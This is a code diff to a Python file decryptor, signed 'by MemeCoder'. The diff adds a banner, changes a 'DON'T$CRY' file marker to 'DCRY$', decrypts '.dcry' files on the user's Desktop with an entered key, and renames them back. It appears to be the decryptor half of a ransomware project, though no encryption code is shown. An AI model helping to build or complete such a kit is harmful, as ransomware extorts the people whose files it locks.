@@ -6,12 +6,32 @@ import sys
 from concurrent.futures import ThreadPoolExecutor
 
 import winshell
+from colorama import Fore, init
 from cryptography.fernet import Fernet, InvalidToken
 
+init(autoreset=True)
+
+baner = rf"""{Fore.LIGHTRED_EX} _______                     __   __             ______                      
+|       \                   |  \ |  \           /      \                     
+| $$$$$$$\  ______   _______| $$_| $$_         |  $$$$$$\  ______   __    __ 
+| $$  | $$ /      \ |       \\$|   $$ \        | $$   \$$ /      \ |  \  |  \
+| $$  | $$|  $$$$$$\| $$$$$$$\  \$$$$$$        | $$      |  $$$$$$\| $$  | $$
+| $$  | $$| $$  | $$| $$  | $$   | $$ __       | $$   __ | $$   \$$| $$  | $$
+| $$__/ $$| $$__/ $$| $$  | $$   | $$|  \      | $$__/  \| $$      | $$__/ $$
+| $$    $$ \$$    $$| $$  | $$    \$$  $$       \$$    $$| $$       \$$    $$
+ \$$$$$$$   \$$$$$$  \$$   \$$     \$$$$         \$$$$$$  \$$       _\$$$$$$$
+                                                                   |  \__| $$
+                                                                    \$$    $$
+                                                                     \$$$$$$
+
+                            Decryptor by MemeCoder                            """
+
 try:
+    print(baner)
+    print()
     key = input("Enter a key: ").strip().encode()
 except KeyboardInterrupt:
-    pass
+    exit(1)
 
 
 def is_valid_key(key):
@@ -27,7 +47,7 @@ def is_valid_key(key):
 
 def start_decryption():
     if not is_valid_key(key):
-        print("Invalid key")
+        print(f"\n{Fore.LIGHTRED_EX}Invalid key")
         input("Press enter to exit...")
         sys.exit(2)
     decrypt_directory(os.path.join(os.environ["USERPROFILE"], "Desktop"), key)
@@ -48,7 +68,7 @@ def start_decryption():
 
 
 def decrypt_file(path, key, chunk_size=268435456):
-    MAGIC = b"DON'T$CRY"
+    MAGIC = b"DCRY$"
     try:
         with open(path, "r+b", buffering=-1) as f:
             header = f.read(len(MAGIC))
@@ -65,12 +85,13 @@ def decrypt_file(path, key, chunk_size=268435456):
                 f.seek(offset)
                 f.write(encrypted_chunk)
             f.seek(0)
+        os.rename(path, os.path.splitext(path)[0])
     except InvalidToken:
-        print("Invalid token")
+        print(f"\n{Fore.LIGHTRED_EX}Invalid token")
         input("Press enter to exit...")
         sys.exit(2)
     except Exception as e:
-        print(f"Error decrypting {path}: {e}")
+        print(f"\n{Fore.LIGHTRED_EX}Error decrypting {path}: {e}")
         return
 
 
@@ -79,7 +100,7 @@ def decrypt_directory(directory_path, key):
         futures = []
         for root, _, files in os.walk(directory_path):
             for file in files:
-                if not os.path.splitext(file)[1].lower() in files_targeted:
+                if os.path.splitext(file)[1].lower() != ".dcry":
                     continue
                 file_path = os.path.join(root, file)
                 futures.append(executor.submit(decrypt_file, file_path, key))
